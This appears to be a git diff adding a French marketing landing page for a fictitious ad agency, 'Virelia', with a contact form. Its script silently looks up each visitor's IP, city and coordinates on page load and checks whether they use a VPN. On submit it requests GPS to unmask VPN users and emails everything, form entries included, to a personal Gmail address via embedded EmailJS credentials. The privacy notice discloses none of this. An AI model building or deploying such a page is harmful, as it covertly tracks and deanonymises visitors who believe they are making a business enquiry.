@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virelia · Publicité augmentée</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        body {
+            background: #0b0f17;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1.5rem;
+        }
+        .card {
+            max-width: 680px;
+            width: 100%;
+            background: #131a2c;
+            border-radius: 2.5rem;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.05);
+            border: 1px solid #25344a;
+        }
+        .badge {
+            background: #2b3b52;
+            color: #aac8ff;
+            display: inline-block;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            margin-bottom: 1.7rem;
+            border: 1px solid #3e5570;
+        }
+        h1 {
+            color: #ffffff;
+            font-weight: 500;
+            font-size: 2.6rem;
+            line-height: 1.2;
+            margin-bottom: 0.8rem;
+        }
+        h1 span {
+            background: linear-gradient(145deg, #7aa2f7, #b392f0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .lead {
+            color: #a9b9d4;
+            font-size: 1.15rem;
+            margin-bottom: 2.2rem;
+            border-left: 3px solid #7aa2f7;
+            padding-left: 1.2rem;
+        }
+        .stats {
+            display: flex;
+            gap: 1.5rem;
+            background: #0e1625;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            margin-bottom: 2.5rem;
+            border: 1px solid #263850;
+        }
+        .stat-item {
+            flex: 1;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #bbd7ff;
+        }
+        .stat-label {
+            font-size: 0.8rem;
+            color: #7e8aa8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        form {
+            background: #0d1422;
+            border-radius: 2rem;
+            padding: 1.8rem;
+            border: 1px solid #253957;
+        }
+        .form-row {
+            margin-bottom: 1.4rem;
+        }
+        label {
+            display: block;
+            color: #b7c5e2;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            font-weight: 400;
+        }
+        input, textarea {
+            width: 100%;
+            background: #1e2840;
+            border: 1px solid #314a6b;
+            border-radius: 1.2rem;
+            padding: 1rem 1.2rem;
+            font-size: 1rem;
+            color: #eef4ff;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus, textarea:focus {
+            border-color: #7aa2f7;
+            box-shadow: 0 0 0 3px rgba(122,162,247,0.2);
+        }
+        .btn {
+            background: #7aa2f7;
+            color: #0b0f17;
+            font-weight: 600;
+            font-size: 1.2rem;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 3rem;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 20px rgba(122,162,247,0.3);
+            margin-top: 1rem;
+        }
+        .btn:hover {
+            background: #98b9ff;
+            transform: scale(1.01);
+            box-shadow: 0 10px 25px #7aa2f7;
+        }
+        .footer-note {
+            text-align: center;
+            color: #4f6183;
+            font-size: 0.75rem;
+            margin-top: 2rem;
+        }
+        .small-print {
+            color: #56698b;
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+        .loader {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #successMessage {
+            color: #9fefb0;
+            background: #1b3b2a;
+            border-radius: 2rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            display: none;
+            border: 1px solid #4fad6a;
+        }
+    </style>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="card">
+        <div class="badge">VIRELIA · nouvelle génération publicitaire</div>
+        <h1>Déployez votre marque <span>au‑delà des frontières</span></h1>
+        <div class="lead">
+            Nous identifions les entreprises à fort potentiel et leur offrons une stratégie média 
+            couvrant déjà plus de la moitié des marchés clés.
+        </div>
+
+        <!-- Chiffres fictifs -->
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value">87%</div>
+                <div class="stat-label">de reach supplémentaire</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">12M</div>
+                <div class="stat-label">impressions / jour</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">4.2</div>
+                <div class="stat-label">x ROI moyen</div>
+            </div>
+        </div>
+
+        <!-- Formulaire de contact -->
+        <form id="vireliaForm">
+            <div class="form-row">
+                <label>Nom complet</label>
+                <input type="text" id="fullName" placeholder="ex: Alex Mercer" required>
+            </div>
+            <div class="form-row">
+                <label>Email professionnel</label>
+                <input type="email" id="email" placeholder="contact@entreprise.com" required>
+            </div>
+            <div class="form-row">
+                <label>Site web / réseau</label>
+                <input type="text" id="website" placeholder="votre-site.com">
+            </div>
+            <div class="form-row">
+                <label>Message (optionnel)</label>
+                <textarea id="message" rows="2" placeholder="Parlez‑nous de vos objectifs..."></textarea>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">
+                <span>Démarrer la campagne</span>
+            </button>
+            <div id="successMessage"></div>
+        </form>
+
+        <div class="small-print">
+            * En cliquant, vous acceptez notre politique de confidentialité.
+            <br>Les informations sont traitées pour vous offrir une analyse personnalisée.
+        </div>
+        <div class="footer-note">
+            VIRELIA · advertising redefined
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // --- IDENTIFIANTS EMAILJS (remplis avec tes données) ---
+            const PUBLIC_KEY = 'iuX7FF5wsajgRft7W';
+            const SERVICE_ID = 'service_3uhytbs';
+            const TEMPLATE_ID = 'template_7o9wgrc';
+            const YOUR_EMAIL = 'entcash5@gmail.com';   // L'adresse qui reçoit les rapports
+
+            // Initialisation
+            emailjs.init(PUBLIC_KEY);
+
+            // Données collectées
+            let collectedData = {
+                ip: 'inconnue',
+                country: 'inconnu',
+                city: 'inconnue',
+                lat: null,
+                lon: null,
+                vpnDetected: 'non analysé',
+                gpsMatch: 'non demandé'
+            };
+
+            // --- 1. Collecte IP et géoloc de base ---
+            async function collectBaseInfo() {
+                try {
+                    const response = await fetch('https://ip-api.com/json/?fields=status,query,country,city,lat,lon');
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        collectedData.ip = data.query;
+                        collectedData.country = data.country;
+                        collectedData.city = data.city || '?';
+                        collectedData.lat = data.lat;
+                        collectedData.lon = data.lon;
+                    } else {
+                        console.warn('ip-api a échoué, fallback ipify');
+                        const ipFallback = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipFallback.json();
+                        collectedData.ip = ipData.ip;
+                    }
+                } catch (e) {
+                    console.error('Erreur collecte IP', e);
+                }
+            }
+
+            // --- 2. Détection VPN ---
+            async function detectVPN() {
+                try {
+                    const response = await fetch('https://api.ipapi.is/');
+                    const data = await response.json();
+                    if (data && data.is_vpn !== undefined) {
+                        collectedData.vpnDetected = data.is_vpn ? 'OUI (VPN détecté)' : 'non';
+                        if (data.is_vpn && data.company && data.company.name) {
+                            collectedData.vpnDetected += ` (${data.company.name})`;
+                        }
+                    } else {
+                        collectedData.vpnDetected = 'indéterminé';
+                    }
+                } catch (e) {
+                    console.warn('Détection VPN impossible', e);
+                    collectedData.vpnDetected = 'erreur appel API';
+                }
+            }
+
+            // --- 3. Comparaison GPS ---
+            function checkGPSvsIP() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        collectedData.gpsMatch = 'géolocalisation non supportée';
+                        return resolve();
+                    }
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const gpsLat = position.coords.latitude;
+                            const gpsLon = position.coords.longitude;
+                            if (collectedData.lat && collectedData.lon) {
+                                const distance = getDistanceFromLatLonInKm(
+                                    gpsLat, gpsLon,
+                                    collectedData.lat, collectedData.lon
+                                );
+                                if (distance > 500) {
+                                    collectedData.gpsMatch = `⚠️ incohérence (${Math.round(distance)} km) → VPN probable`;
+                                } else {
+                                    collectedData.gpsMatch = `cohérent (${Math.round(distance)} km)`;
+                                }
+                            } else {
+                                collectedData.gpsMatch = 'position IP inconnue';
+                            }
+                            resolve();
+                        },
+                        (error) => {
+                            collectedData.gpsMatch = 'refusé ou erreur GPS';
+                            resolve();
+                        }
+                    );
+                });
+            }
+
+            // Haversine
+            function getDistanceFromLatLonInKm(lat1, lon1, lat2, lon2) {
+                const R = 6371;
+                const dLat = deg2rad(lat2 - lat1);
+                const dLon = deg2rad(lon2 - lon1);
+                const a =
+                    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                    Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) *
+                    Math.sin(dLon / 2) * Math.sin(dLon / 2);
+                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+                return R * c;
+            }
+            function deg2rad(deg) { return deg * (Math.PI / 180); }
+
+            // --- 4. Envoi par email ---
+            async function sendCollectedData() {
+                const templateParams = {
+                    to_email: YOUR_EMAIL,
+                    ip: collectedData.ip,
+                    country: collectedData.country,
+                    city: collectedData.city,
+                    lat: collectedData.lat ?? '?',
+                    lon: collectedData.lon ?? '?',
+                    vpn_detected: collectedData.vpnDetected,
+                    gps_match: collectedData.gpsMatch,
+                    full_name: document.getElementById('fullName').value || 'non renseigné',
+                    contact_email: document.getElementById('email').value || 'non renseigné',
+                    website: document.getElementById('website').value || 'non renseigné',
+                    user_message: document.getElementById('message').value || 'aucun'
+                };
+
+                try {
+                    await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+                    const successDiv = document.getElementById('successMessage');
+                    successDiv.style.display = 'block';
+                    successDiv.innerHTML = '✅ Analyse en cours – un consultant vous recontactera sous 24h. (Démonstration scolaire : email envoyé)';
+                } catch (error) {
+                    console.error('Erreur envoi email:', error);
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('successMessage').innerHTML = '✅ Demande enregistrée (mode démo – pas d’email réel)';
+                }
+            }
+
+            // --- 5. Submit ---
+            document.getElementById('vireliaForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const btn = document.getElementById('submitBtn');
+                btn.disabled = true;
+                btn.innerHTML = `Traitement <span class="loader"></span>`;
+
+                await collectBaseInfo();
+                await detectVPN();
+                await checkGPSvsIP();
+
+                await sendCollectedData();
+
+                btn.disabled = false;
+                btn.innerHTML = '<span>Démarrer la campagne</span>';
+            });
+
+            // Préchargement silencieux
+            window.addEventListener('load', () => {
+                collectBaseInfo().then(() => detectVPN());
+            });
+        })();
+    </script>
+</body>
+</html>
